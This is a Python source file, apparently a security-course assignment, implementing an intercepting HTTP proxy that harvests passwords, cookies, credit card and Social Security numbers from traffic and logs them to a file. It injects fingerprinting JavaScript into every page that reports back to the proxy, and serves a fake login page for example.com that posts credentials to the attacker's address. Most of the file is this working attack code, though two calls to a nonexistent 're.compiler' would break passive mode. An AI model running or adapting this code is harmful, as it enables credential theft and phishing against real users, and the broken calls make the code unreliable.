import argparse
import gzip
import re
import socket
import concurrent.futures
import threading
import signal
import sys
import zlib
import brotli
import datetime
from urllib.parse import urlparse
from urllib.parse import unquote

args = None
file_lock = threading.Lock()


# Get the command line arguments
def get_args():
    global args

    parser = argparse.ArgumentParser(description="DNS Injector")
    parser.add_argument(
        "-m", "--mode", help="passive | active, the mode the proxy should run in"
    )
    parser.add_argument("address", help="The IP address of the proxy")
    parser.add_argument("port", help="The port of the proxy")
    args = parser.parse_args()


# In addition to forwarding packets it should look for info in the packets and log them in info_1.txt, so append
# The info to look for are
# Username/emails and passwords in query params or in forms
# Credit card numbers or SSN
# Cookies in the HTTP request


# HINT: use regex to capture nuances of different format types, look both at req and res packets
# HINT: info can be passed in the URL and headers too


def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
    info = []

    for line in lines:
        match = pattern.search(line)

        if match:
            info.append(match.group(1))

    return info


def passive(data: str, url: str):
    search_lines = data.split("\r\n")

    username_pattern = re.compile(r"\buser(?:name)?=([^&\s]+)")
    password_pattern = re.compile(r"\bpass(?:word)?=([^&\s]+)")
    email_pattern = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")
    credit_card_pattern = re.compile(r"\b(?:\d{4}[- ]?){3}\d{4}\b")
    ssn_pattern = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
    name_pattern = re.compiler(r"\b[A-Z][a-z]+ [A-Z][a-z]+\b")
    address_pattern = re.compile(
        r"\b\d+\s[A-Z][a-zA-Z\s]+\b,?\s[A-Z]{2}\s\d{5}(-\d{4})?"
    )
    phone_pattern = re.compiler(r"\b(\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4}\b")
    cookie_pattern = re.compile(r"Cookie:\s?(.*)")

    # Search for matches
    usernames = get_info(username_pattern, search_lines)
    passwords = get_info(password_pattern, search_lines)
    emails = get_info(email_pattern, search_lines)
    credit_cards = get_info(credit_card_pattern, search_lines)
    ssns = get_info(ssn_pattern, search_lines)
    name_pattern = get_info(name_pattern, search_lines)
    address_pattern = get_info(address_pattern, search_lines)
    phone_pattern = get_info(phone_pattern, search_lines)
    cookies = get_info(cookie_pattern, search_lines)

    # Log information (append to file)
    with file_lock:
        with open("info_1.txt", "a") as f:
            f.write(f"URL: {url}\n")
            f.write(f"Emails: {emails}\n") if len(emails) > 0 else None
            f.write(f"Usernames: {usernames}\n") if len(usernames) > 0 else None
            f.write(f"Passwords: {passwords}\n") if len(passwords) > 0 else None
            f.write(f"Credit Cards: {credit_cards}\n") if len(
                credit_cards
            ) > 0 else None
            f.write(f"SSNs: {ssns}\n") if len(ssns) > 0 else None
            f.write(f"Names: {name_pattern}\n") if len(name_pattern) > 0 else None
            f.write(f"Addresses: {address_pattern}\n") if len(
                address_pattern
            ) > 0 else None
            f.write(f"Phone Numbers: {phone_pattern}\n") if len(
                phone_pattern
            ) > 0 else None
            f.write(f"Cookies: {cookies}\n") if len(cookies) > 0 else None
            f.write("\n")


# In addition to forwarding packets it should inject JS code that should perform fingerprinting on the cient
# Info to gather: user agent, screen resolution, language
# Those info should be then sent back to the proxy with a GET request using:
# http://proxy ip address/?user-agent=USER AGENT&screen=SCREEN RES&lang=LANGUAGE
# On receive those info should be parsed and logged in info_2.txt

# HINT: For user-agent and language look into JS navigator module
# HINT: For screen resolution look into JS window module
# HINT: To send the strings as query param they must be encoded correctly


# Also for predefined domains a fake login page should be used to capture credentials ie. user search example.com
def active(body: str) -> str:
    global args

    func = """
    <script>
    (function() {{
        // Gather information
        var userAgent = navigator.userAgent; // User agent
        var screenRes = screen.width + 'x' + screen.height; // Screen resolution
        var language = navigator.language; // Language

        // Encode the parameters
        var queryParams = 'user-agent=' + encodeURIComponent(userAgent) +
                        '&screen=' + encodeURIComponent(screenRes) +
                        '&lang=' + encodeURIComponent(language);

        // Send data to the proxy
        var proxyUrl = 'http://{0}:{1}/?' + queryParams;

        // Use fetch API to send the GET request
        console.log(proxyUrl)

        fetch(proxyUrl);
    }})();
    </script>
    """.format(
        args.address, args.port
    )

    # Inject the JS code
    body = body.replace("</body>", func + "</body>")

    return body


def get_server_port(url: str) -> (str, int):
    pattern = re.compile(r"([a-zA-Z0-9.-]+)(?::(\d+))?")
    match = pattern.match(url)

    if match:
        domain = match.group(1)
        port = int(match.group(2)) if match.group(2) else 80  # Default port is 80
        return domain, port
    else:
        return None, None


def decode_body(header: str, body: bytes) -> (str, str):
    encoding = get_encoding(header)

    if encoding == "gzip":
        print("[*] Decompressing gzip")
        return (gzip.decompress(body).decode("utf-8"), encoding)
    elif encoding == "deflate":
        print("[*] Decompressing deflate")
        return (zlib.decompress(body).decode("utf-8"), encoding)
    elif encoding == "br":
        print("[*] Decompressing brotli")
        return (brotli.decompress(body).decode("utf-8"), encoding)
    else:
        print("[*] No encoding found")

        try:
            return (body.decode("utf-8"), None)
        except UnicodeDecodeError:
            print("[*] Could not decode response")

    return ("", None)


def encode_body(body: str, encoding: str) -> bytes:
    injected = body.encode("utf-8")

    if encoding == "gzip":
        injected = gzip.compress(injected)
    elif encoding == "deflate":
        injected = zlib.compress(injected)
    elif encoding == "br":
        injected = brotli.compress(injected)

    return injected


def get_data(socket: socket):
    data = b""

    while True:
        part = socket.recv(4096)
        data += part
        if len(part) < 4096:
            # Either 0 or end of data
            break

    return data


def get_encoding(http: str) -> str:
    pattern = re.compile(r"Content-Encoding:\s*([a-zA-Z0-9-]+)")

    # Search for the pattern
    match = pattern.search(http)

    if match:
        return match.group(1)

    return None


def get_url(req: str) -> str:
    match = re.search(r"^Host:\s*(.+)$", req, re.MULTILINE)

    if match:
        return match.group(1).strip()

    return None


def get_query(req: str) -> dict[str, str]:
    query = {}

    url = unquote(req.split("\r\n")[0].split(" ")[1])

    for param in urlparse(url).query.split("&"):
        key, value = param.split("=")
        query[key] = value

    return query


def log_query(query: dict[str, str]):
    with file_lock:
        with open("info_2.txt", "a") as f:
            f.write(f"Fingerprint:\n")

            for key, value in query.items():
                f.write(f"{key}: {value}\n")

            f.write("\n")


def get_fake_login() -> bytes:
    global args

    print("[*] Generating fake login page")

    body = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login Page</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background-color: #f2f2f2;
                }}

                .login-container {{
                    background-color: white;
                    padding: 20px;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }}

                .login-container h2 {{
                    text-align: center;
                }}

                form {{
                    display: flex;
                    flex-direction: column;
                }}

                input[type="text"], input[type="password"] {{
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                }}

                button[type="submit"] {{
                    padding: 10px;
                    background-color: #007bff;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }}

                button[type="submit"]:hover {{
                    background-color: #0056b3;
                }}
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Login</h2>
                <form action="http://{args.address}:{args.port}/login" method="post">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        """.encode(
        "utf-8"
    )

    utc_time = datetime.datetime.utcnow()

    # Format the time in the RFC 1123 format (e.g., Mon, 23 Nov 2023 12:00:00 GMT)
    format_gmt_time = utc_time.strftime("%a, %d %b %Y %H:%M:%S GMT")

    headers = f"""
        HTTP/1.1 200 OK
        Date: {format_gmt_time}
        Server: Apache/2.4.41 (Unix)
        Content-Type: text/html; charset=UTF-8
        Content-Length: {len(body)}
        Connection: close""".strip().encode(
        "utf-8"
    )

    return headers + b"\r\n\r\n" + body


def handle_client(client_sock: socket, passive_mode: bool):
    try:
        while True:
            # Receive data from the client
            client_data = get_data(client_sock)

            if client_data == b"":  # The client closed the connection
                break

            request = client_data.decode("utf-8")

            print(f"[*] Received {len(client_data)} bytes from the client.")

            # Get the URL from the request based on the host header
            url = get_url(request)

            if not url:
                print("[!] No URL found, skipping...")
                continue

            if passive_mode:
                passive(request, url)
            else:
                if url == f"{args.address}:{args.port}":
                    print("[*] Obtained data from the client")

                    log_query(get_query(request))
                    # save those data in a file

                    client_sock.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
                    continue
                elif url == "example.com":
                    print("[*] Redirecting to fake login page")
                    res = get_fake_login()
                    client_sock.sendall(res)
                    break

            # Forward the request to the target server and fetch the response
            target_server = get_server_port(url)

            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_socket.connect(target_server)
            proxy_socket.sendall(client_data)

            # Receive the response from the target server
            response_data = get_data(proxy_socket)

            print(f"[*] Received {len(response_data)} bytes from the server.")

            # Split the response into headers and body
            response_components = response_data.split(b"\r\n\r\n")

            headers = response_components[0].decode("utf-8")

            body, encoding = decode_body(headers, response_components[1])

            if passive_mode:
                passive(headers + "\r\n" + body, url)
            else:
                injected = encode_body(active(body), encoding)

                response_data = (
                    re.sub(
                        r"Content-Length: \d+",
                        f"Content-Length: {len(injected)}",
                        headers,
                    ).encode("utf-8")
                    + b"\r\n\r\n"
                    + injected
                )

            client_sock.sendall(response_data)

    finally:
        client_sock.close()


def main():
    global args

    get_args()

    if args.mode:
        if args.mode == "passive" or args.mode == "active":
            print(f"[*] Running in {args.mode} mode")
        else:
            print("[!] Invalid mode, exiting...")
            sys.exit(1)
    else:
        print("[*] No mode provided, running in passive mode")

    # Create a socket for the proxy to listen on
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((args.address, int(args.port)))
        listener.listen(10)

        print(f"[*] Listening on {args.address}:{args.port}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            signal.signal(
                signal.SIGINT,
                lambda s, f: executor.shutdown(wait=False) and sys.exit(0),
            )

            while True:
                client_sock, addr = listener.accept()

                print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

                executor.submit(
                    handle_client, client_sock, False if args.mode == "active" else True
                )


if __name__ == "__main__":
    main()
